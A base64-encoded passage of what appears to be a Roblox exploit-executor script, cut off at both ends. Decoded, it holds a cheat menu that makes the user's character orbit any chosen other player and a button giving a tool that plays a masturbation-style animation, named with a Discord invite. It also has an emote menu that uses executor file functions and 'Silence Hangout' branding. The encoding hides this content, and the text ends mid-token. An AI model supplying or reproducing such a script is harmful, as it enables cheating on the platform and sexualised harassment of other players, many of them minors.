QCIgLi4gcGxheWVyLk5hbWUKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gZ2V0UGxheWVyT3B0aW9ucygpCiAgICAgICAgICAgIGxvY2FsIG9wdGlvbnMgPSB7fQogICAgICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChvcHRpb25zLCBmb3JtYXRQbGF5ZXIocGxheWVyKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBvcHRpb25zCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGN1cnJlbnRPcmJpdENvbm5lY3Rpb24KICAgICAgICBsb2NhbCBsb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBvcmJpdFJhZGl1cyA9IDEwCiAgICAgICAgbG9jYWwgb3JiaXRTcGVlZCA9IDIKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc3RhcnRPcmJpdCh0YXJnZXRQbGF5ZXIpCiAgICAgICAgICAgIGlmIGN1cnJlbnRPcmJpdENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgY3VycmVudE9yYml0Q29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIGN1cnJlbnRPcmJpdENvbm5lY3Rpb24gPSBuaWwKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICBsb2NhbCBsb2NhbFJvb3QgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIGxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiBsb2NhbFJvb3QgdGhlbgogICAgICAgICAgICAgICAgICAgIGN1cnJlbnRPcmJpdENvbm5lY3Rpb24gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKGRlbHRhVGltZSkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYW5nbGUgPSB0aWNrKCkgKiBvcmJpdFNwZWVkCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG9mZnNldCA9IFZlY3RvcjMubmV3KG1hdGguY29zKGFuZ2xlKSAqIG9yYml0UmFkaXVzLCAwLCBtYXRoLnNpbihhbmdsZSkgKiBvcmJpdFJhZGl1cykKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbmV3UG9zaXRpb24gPSAodGFyZ2V0Um9vdC5DRnJhbWUgKiBDRnJhbWUubmV3KG9mZnNldCkpLlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsUm9vdC5DRnJhbWUgPSBDRnJhbWUubG9va0F0KG5ld1Bvc2l0aW9uLCB0YXJnZXRSb290LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgcGxheWVyRHJvcGRvd24sIHRvZ2dsZQoKICAgICAgICBwbGF5ZXJEcm9wZG93biA9IFRhYjI6Q3JlYXRlRHJvcGRvd24oewogICAgICAgICAgICBOYW1lID0gIlBsYXllciBMaXN0IiwKICAgICAgICAgICAgT3B0aW9ucyA9IGdldFBsYXllck9wdGlvbnMoKSwKICAgICAgICAgICAgQ3VycmVudE9wdGlvbiA9IHt9LAogICAgICAgICAgICBNdWx0aXBsZU9wdGlvbnMgPSBmYWxzZSwKICAgICAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICAgICAgICAgIGlmIGN1cnJlbnRPcmJpdENvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgICAgIGN1cnJlbnRPcmJpdENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgY3VycmVudE9yYml0Q29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRbMV0gYW5kIHRvZ2dsZS5DdXJyZW50VmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllck5hbWUgPSBzZWxlY3RlZFsxXTptYXRjaCgiQCguKykiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGFyZ2V0UGxheWVyTmFtZSkKICAgICAgICAgICAgICAgICAgICBzdGFydE9yYml0KHRhcmdldFBsYXllcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICB9KQoKICAgICAgICB0b2dnbGUgPSBUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgICAgIE5hbWUgPSAiT3JiaXQgUGxheWVyIiwKICAgICAgICAgICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICAgICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgICAgICBpZiBjdXJyZW50T3JiaXRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICBjdXJyZW50T3JiaXRDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgIGN1cnJlbnRPcmJpdENvbm5lY3Rpb24gPSBuaWwKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHZhbHVlIGFuZCBwbGF5ZXJEcm9wZG93bi5DdXJyZW50T3B0aW9uWzFdIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQbGF5ZXJOYW1lID0gcGxheWVyRHJvcGRvd24uQ3VycmVudE9wdGlvblsxXTptYXRjaCgiQCguKykiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGFyZ2V0UGxheWVyTmFtZSkKICAgICAgICAgICAgICAgICAgICBzdGFydE9yYml0KHRhcmdldFBsYXllcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICB9KQoKICAgICAgICBsb2NhbCBmdW5jdGlvbiB1cGRhdGVEcm9wZG93bigpCiAgICAgICAgICAgIGxvY2FsIG5ld09wdGlvbnMgPSBnZXRQbGF5ZXJPcHRpb25zKCkKICAgICAgICAgICAgcGxheWVyRHJvcGRvd246U2V0T3B0aW9ucyhuZXdPcHRpb25zKQogICAgICAgIGVuZAoKICAgICAgICBQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QodXBkYXRlRHJvcGRvd24pCiAgICAgICAgUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KHVwZGF0ZURyb3Bkb3duKQoKICAgICAgICBOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiUGxheWVycyBMb2FkZWQiLAogICAgICAgICAgICBDb250ZW50ID0gIlRoZSBwbGF5ZXIgbGlzdCBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgbG9hZGVkLiIsCiAgICAgICAgICAgIER1cmF0aW9uID0gNgogICAgICAgIH0pCiAgICBlbmQsCiAgICBCdXR0b24yID0gdHJ1ZSwKICAgIEJ1dHRvbjJUZXh0ID0gIk5vIiwKICAgIEJ1dHRvbjJDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiQWN0aW9uIENhbmNlbGxlZCIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiUGxheWVyIGxpc3Qgd2FzIG5vdCBsb2FkZWQuIiwKICAgICAgICAgICAgRHVyYXRpb24gPSA0CiAgICAgICAgfSkKICAgIGVuZAp9KQoKbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGJhY2twYWNrID0gcGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQoKbG9jYWwgZnVuY3Rpb24gZ2l2ZVRvb2woKQogICBsb2NhbCB0b29sID0gSW5zdGFuY2UubmV3KCJUb29sIikKICAgdG9vbC5OYW1lID0gIiRpbGVuY2UuV3RmIEplcmsgT2ZmIC5nZy9kak1RUkNOQUFaIgoKICAgbG9jYWwgaGFuZGxlID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKICAgaGFuZGxlLk5hbWUgPSAiSGFuZGxlIgogICBoYW5kbGUuU2l6ZSA9IFZlY3RvcjMubmV3KDEsIDEsIDEpCiAgIGhhbmRsZS5DYW5Db2xsaWRlID0gZmFsc2UKICAgaGFuZGxlLlRyYW5zcGFyZW5jeSA9IDEKICAgaGFuZGxlLlBhcmVudCA9IHRvb2wKICAgdG9vbC5SZXF1aXJlc0hhbmRsZSA9IHRydWUKCiAgIGxvY2FsIGh1bWFub2lkID0gcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICBsb2NhbCBqZXJrQW5pbSA9IEluc3RhbmNlLm5ldygiQW5pbWF0aW9uIikKICAgamVya0FuaW0uQW5pbWF0aW9uSWQgPSAicmJ4YXNzZXRpZDovLzY5ODI1MTY1MyIKCiAgIGxvY2FsIGplcmsKICAgbG9jYWwgamVya2luZyA9IGZhbHNlCiAgIGxvY2FsIGplcmtTcGVlZCA9IDEKICAgbG9jYWwgdGltZVBvc2l0aW9uID0gMC42CgogICBsb2NhbCBmdW5jdGlvbiBwbGF5SmVya0FuaW1hdGlvbigpCiAgICAgICBpZiBqZXJraW5nIHRoZW4KICAgICAgICAgICB3YXJuKCJKZXJrIGFuaW1hdGlvbiBpcyBhbHJlYWR5IHBsYXlpbmcuIikKICAgICAgICAgICByZXR1cm4KICAgICAgIGVuZAoKICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICBqZXJrID0gaHVtYW5vaWQ6TG9hZEFuaW1hdGlvbihqZXJrQW5pbSkKICAgICAgICAgICBqZXJraW5nID0gdHJ1ZQoKICAgICAgICAgICBqZXJrOlBsYXkoKQogICAgICAgICAgIGplcms6QWRqdXN0U3BlZWQoamVya1NwZWVkKQogICAgICAgICAgIGplcmsuVGltZVBvc2l0aW9uID0gdGltZVBvc2l0aW9uCgogICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICB3aGlsZSBqZXJraW5nIGRvCiAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgaWYgbm90IGplcmtpbmcgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICBqZXJrOlBsYXkoKQogICAgICAgICAgICAgICAgICAgamVyay5UaW1lUG9zaXRpb24gPSB0aW1lUG9zaXRpb24KICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCgogICAgICAgICAgICAgICAgICAgd2hpbGUgamVyay5UaW1lUG9zaXRpb24gPCB0aW1lUG9zaXRpb24gZG8KICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgamVyazpTdG9wKCkKICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgZW5kKQogICAgICAgZW5kCiAgIGVuZAoKICAgbG9jYWwgZnVuY3Rpb24gc3RvcEplcmtBbmltYXRpb24oKQogICAgICAgaWYgamVyayB0aGVuCiAgICAgICAgICAgamVyazpTdG9wKCkKICAgICAgICAgICBqZXJrOkRlc3Ryb3koKQogICAgICAgZW5kCiAgICAgICBqZXJraW5nID0gZmFsc2UKICAgZW5kCgogICB0b29sLkVxdWlwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgaHVtYW5vaWQgPSBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICBwbGF5SmVya0FuaW1hdGlvbigpCiAgIGVuZCkKCiAgIHRvb2wuVW5lcXVpcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgIHN0b3BKZXJrQW5pbWF0aW9uKCkKICAgZW5kKQoKICAgdG9vbC5QYXJlbnQgPSBiYWNrcGFjawplbmQKClRhYjI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiSmVyayBUb29sIChGRSkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZ2l2ZVRvb2woKQogICAgZW5kCn0pCgoKCmxvY2FsIEF2YXRhckVkaXRvclNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkF2YXRhckVkaXRvclNlcnZpY2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFBsYXllckNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKClRhYjI6Q3JlYXRlRHJvcGRvd24oewogICAgTmFtZSA9ICJUZXN0IERyb3Bkb3duIiwKICAgIE9wdGlvbnMgPSB7Ik9wdGlvbiAxIiwgIk9wdGlvbiAyIiwgIk9wdGlvbiAzIn0sCiAgICBDdXJyZW50T3B0aW9uID0geyJPcHRpb24gMSJ9LAogICAgTXVsdGlwbGVPcHRpb25zID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIHByaW50KCJTZWxlY3RlZCBvcHRpb25zOiIsIHRhYmxlLmNvbmNhdChzZWxlY3RlZCwgIiwgIikpCiAgICBlbmQKfSkKCi0ta2V5YmluZCB0byBvcGVuIGlzIGNvbW1hCi0tbWFkZSBieSBHaSM3MzMxCgpsb2NhbCBJc1N0dWRpbyA9IGZhbHNlCgpsb2NhbCBDb250ZXh0QWN0aW9uU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiQ29udGV4dEFjdGlvblNlcnZpY2UiKQpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBHdWlTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJHdWlTZXJ2aWNlIikKbG9jYWwgQ29yZUd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCmxvY2FsIEF2YXRhckVkaXRvclNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkF2YXRhckVkaXRvclNlcnZpY2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgU3RhcnRlckd1aSA9IGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpCmxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQoKbG9jYWwgRW1vdGVzID0ge30KbG9jYWwgZnVuY3Rpb24gQWRkRW1vdGUobmFtZTogc3RyaW5nLCBpZDogSW50VmFsdWUsIHByaWNlOiBJbnRWYWx1ZT8sIGlzVUdDOiBib29sZWFuPykKCWlmIG5vdCAobmFtZSBhbmQgaWQpIHRoZW4KCQlyZXR1cm4KCWVuZAoJdGFibGUuaW5zZXJ0KEVtb3RlcywgewoJCW5hbWUgPSBuYW1lLAoJCWlkID0gaWQsCgkJaWNvbiA9ICJyYnh0aHVtYjovL3R5cGU9QXNzZXQmaWQ9Ii4uIGlkIC4uIiZ3PTE1MCZoPTE1MCIsCgkJcHJpY2UgPSBwcmljZSBvciAwLAoJCWluZGV4ID0gI0Vtb3RlcyArIDEsCgkJaXNVR0MgPSBpc1VHQyBvciBmYWxzZSwKCQlzb3J0ID0ge30KCX0pCmVuZAoKbG9jYWwgQ3VycmVudFNvcnQgPSAibmV3ZXN0Zmlyc3QiCmxvY2FsIEN1cnJlbnRHcmlkU2l6ZSA9ICJtZWRpdW0iCmxvY2FsIEN1cnJlbnRTaXplID0gIm1lZGl1bSIKbG9jYWwgR3JpZFNpemVTY2FsZXMgPSB7CglzbWFsbCA9IFVEaW0yLm5ldygwLjA5LCAwLCAwLCAwKSwKCW1lZGl1bSA9IFVEaW0yLm5ldygwLjEwNSwgMCwgMCwgMCksCglsYXJnZSA9IFVEaW0yLm5ldygwLjE1LCAwLCAwLCAwKSwKfQpsb2NhbCBTaXplU2NhbGVzID0geyBzbWFsbCA9IDAuOSwgbWVkaXVtID0gMS4zLCBsYXJnZSA9IDEuNCB9CmxvY2FsIEZhdm9yaXRlT2ZmID0gInJieGFzc2V0aWQ6Ly8xMDY1MTA2MDY3NyIKbG9jYWwgRmF2b3JpdGVPbiA9ICJyYnhhc3NldGlkOi8vMTA2NTEwNjExMDkiCmxvY2FsIEZhdm9yaXRlZEVtb3RlcyA9IHt9CmxvY2FsIHNob3VsZENsb3NlT25FbW90ZSA9IHRydWUKbG9jYWwgc2hvd0Zhdm9yaXRlcyA9IHRydWUKbG9jYWwgc2hvd1JhbmRvbSA9IHRydWUKbG9jYWwgaXNNZW51RW5hYmxlZCA9IGZhbHNlIC0tIFRyYWNrcyB3aGV0aGVyIHRoZSBtZW51IGlzIGVuYWJsZWQKCmxvY2FsIGZ1bmN0aW9uIElzRmlsZUZ1bmMoLi4uKQoJaWYgSXNTdHVkaW8gdGhlbgoJCXJldHVybgoJZWxzZWlmIGlzZmlsZSB0aGVuCgkJcmV0dXJuIGlzZmlsZSguLi4pCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBXcml0ZUZpbGVGdW5jKC4uLikKCWlmIElzU3R1ZGlvIHRoZW4KCQlyZXR1cm4KCWVsc2VpZiB3cml0ZWZpbGUgdGhlbgoJCXJldHVybiB3cml0ZWZpbGUoLi4uKQoJZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gUmVhZEZpbGVGdW5jKC4uLikKCWlmIElzU3R1ZGlvIHRoZW4KCQlyZXR1cm4KCWVsc2VpZiByZWFkZmlsZSB0aGVuCgkJcmV0dXJuIHJlYWRmaWxlKC4uLikKCWVuZAplbmQKCmlmIG5vdCBJc1N0dWRpbyB0aGVuCglpZiBJc0ZpbGVGdW5jKCJGYXZvcml0ZWRFbW90ZXMudHh0IikgdGhlbgoJCWlmIG5vdCBwY2FsbChmdW5jdGlvbigpCgkJCUZhdm9yaXRlZEVtb3RlcyA9IEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUoUmVhZEZpbGVGdW5jKCJGYXZvcml0ZWRFbW90ZXMudHh0IikpCgkJZW5kKSB0aGVuCgkJCUZhdm9yaXRlZEVtb3RlcyA9IHt9CgkJZW5kCgllbHNlCgkJV3JpdGVGaWxlRnVuYygiRmF2b3JpdGVkRW1vdGVzLnR4dCIsIEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoRmF2b3JpdGVkRW1vdGVzKSkKCWVuZAoJbG9jYWwgVXBkYXRlZEZhdm9yaXRlcyA9IHt9Cglmb3IgaSwgbmFtZSBpbiBwYWlycyhGYXZvcml0ZWRFbW90ZXMpIGRvCgkJaWYgdHlwZW9mKG5hbWUpID09ICJzdHJpbmciIHRoZW4KCQkJZm9yIGksIGVtb3RlIGluIHBhaXJzKEVtb3RlcykgZG8KCQkJCWlmIGVtb3RlLm5hbWUgPT0gbmFtZSB0aGVuCgkJCQkJdGFibGUuaW5zZXJ0KFVwZGF0ZWRGYXZvcml0ZXMsIGVtb3RlLmlkKQoJCQkJCWJyZWFrCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbmQKCWlmICNVcGRhdGVkRmF2b3JpdGVzIH49IDAgdGhlbgoJCUZhdm9yaXRlZEVtb3RlcyA9IFVwZGF0ZWRGYXZvcml0ZXMKCQlXcml0ZUZpbGVGdW5jKCJGYXZvcml0ZWRFbW90ZXMudHh0IiwgSHR0cFNlcnZpY2U6SlNPTkVuY29kZShGYXZvcml0ZWRFbW90ZXMpKQoJZW5kCmVuZAoKbG9jYWwgU2NyZWVuR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQpTY3JlZW5HdWkuTmFtZSA9ICJFbW90ZXMiClNjcmVlbkd1aS5EaXNwbGF5T3JkZXIgPSAyClNjcmVlbkd1aS5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwpTY3JlZW5HdWkuUmVzZXRPblNwYXduID0gZmFsc2UKU2NyZWVuR3VpLkVuYWJsZWQgPSBmYWxzZQoKbG9jYWwgQmFja0ZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCkJhY2tGcmFtZS5TaXplID0gVURpbTIubmV3KDAuOSwgMCwgMC41LCAwKQpCYWNrRnJhbWUuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKQmFja0ZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQpCYWNrRnJhbWUuU2l6ZUNvbnN0cmFpbnQgPSBFbnVtLlNpemVDb25zdHJhaW50LlJlbGF0aXZlWVkKQmFja0ZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCkJhY2tGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCkJhY2tGcmFtZS5QYXJlbnQgPSBTY3JlZW5HdWkKCmxvY2FsIFRleHRMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKVGV4dExhYmVsLlNpemUgPSBVRGltMi5uZXcoMC42LCAwLCAwLjIsIDApClRleHRMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKVGV4dExhYmVsLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpClRleHRMYWJlbC5UZXh0ID0gIk1BREUgQlkgJElMRU5DRS5XVEYiClRleHRMYWJlbC5UZXh0U2NhbGVkID0gdHJ1ZQpUZXh0TGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClRleHRMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpUZXh0TGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkIApUZXh0TGFiZWwuVGV4dFNpemUgPSA0MApUZXh0TGFiZWwuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAuOApUZXh0TGFiZWwuVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClRleHRMYWJlbC5aSW5kZXggPSAxClRleHRMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gMC43ClRleHRMYWJlbC5QYXJlbnQgPSBCYWNrRnJhbWUKCmxvY2FsIEVtb3RlTmFtZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKRW1vdGVOYW1lLk5hbWUgPSAiRW1vdGVOYW1lIgpFbW90ZU5hbWUuVGV4dFNjYWxlZCA9IHRydWUKRW1vdGVOYW1lLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCkVtb3RlTmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygtMC4xLCAwLCAwLjUsIDApCkVtb3RlTmFtZS5TaXplID0gVURpbTIubmV3KDAuMiwgMCwgMC4yLCAwKQpFbW90ZU5hbWUuU2l6ZUNvbnN0cmFpbnQgPSBFbnVtLlNpemVDb25zdHJhaW50LlJlbGF0aXZlWVkKRW1vdGVOYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDMwKQpFbW90ZU5hbWUuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKRW1vdGVOYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKRW1vdGVOYW1lLlRleHQgPSAiU2VsZWN0IGFuIEVtb3RlIgpsb2NhbCBDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKQ29ybmVyLlBhcmVudCA9IEVtb3RlTmFtZQpFbW90ZU5hbWUuUGFyZW50ID0gQmFja0ZyYW1lCgpsb2NhbCBMb2FkaW5nID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBCYWNrRnJhbWUpCkxvYWRpbmcuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKTG9hZGluZy5UZXh0ID0gIltTaWxlbmNlIEhhbmdvdXRdIExvYWRpbmcuLi4iCkxvYWRpbmcuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKTG9hZGluZy5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQpMb2FkaW5nLlRleHRTY2FsZWQgPSB0cnVlCkxvYWRpbmcuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNQpMb2FkaW5nLlNpemUgPSBVRGltMi5mcm9tU2NhbGUoMC4yLCAwLjEpCkxvYWRpbmcuUG9zaXRpb24gPSBVRGltMi5mcm9tU2NhbGUoMC41LCAwLjIpCkNvcm5lcjpDbG9uZSgpLlBhcmVudCA9IExvYWRpbmcKTG9hZGluZy5QYXJlbnQgPSBCYWNrRnJhbWUKCmxvY2FsIEZyYW1lID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIpCkZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKRnJhbWUuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQpGcmFtZS5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKRnJhbWUuU2Nyb2xsaW5nRGlyZWN0aW9uID0gRW51bS5TY3JvbGxpbmdEaXJlY3Rpb24uWQpGcmFtZS5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQpGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKRnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKRnJhbWUuU2Nyb2xsQmFyVGhpY2tuZXNzID0gNQpGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCkZyYW1lLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCglFbW90ZU5hbWUuVGV4dCA9ICJTZWxlY3QgYW4gRW1vdGUiCmVuZCkKRnJhbWUuUGFyZW50ID0gQmFja0ZyYW1lCgpsb2NhbCBHcmlkID0gSW5zdGFuY2UubmV3KCJVSUdyaWRMYXlvdXQiKQpHcmlkLkNlbGxTaXplID0gR3JpZFNpemVTY2FsZXNbQ3VycmVudEdyaWRTaXplXQpHcmlkLkNlbGxQYWRkaW5nID0gVURpbTIubmV3KDAuMDA2LCAwLCAwLjAwNiwgMCkKR3JpZC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgpHcmlkLlBhcmVudCA9IEZyYW1lCgpsb2NhbCBTaXplRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKU2l6ZUZyYW1lLlZpc2libGUgPSBmYWxzZQpTaXplRnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMApTaXplRnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgNSwgLTAuMjI1LCAwKQpTaXplRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLjIsIDAsIDAsIDApClNpemVGcmFtZS5BdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKU2l6ZUZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCkNvcm5lcjpDbG9uZSgpLlBhcmVudCA9IFNpemVGcmFtZQpTaXplRnJhbWUuUGFyZW50ID0gQmFja0ZyYW1lCgpsb2NhbCBTaXplTGlzdCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikKU2l6ZUxpc3QuUGFkZGluZyA9IFVEaW0ubmV3KDAuMDIsIDApClNpemVMaXN0Lkhvcml6b250YWxBbGlnbm1lbnQgPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuQ2VudGVyClNpemVMaXN0LlZlcnRpY2FsQWxpZ25tZW50ID0gRW51bS5WZXJ0aWNhbEFsaWdubWVudC5Ub3AKU2l6ZUxpc3QuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5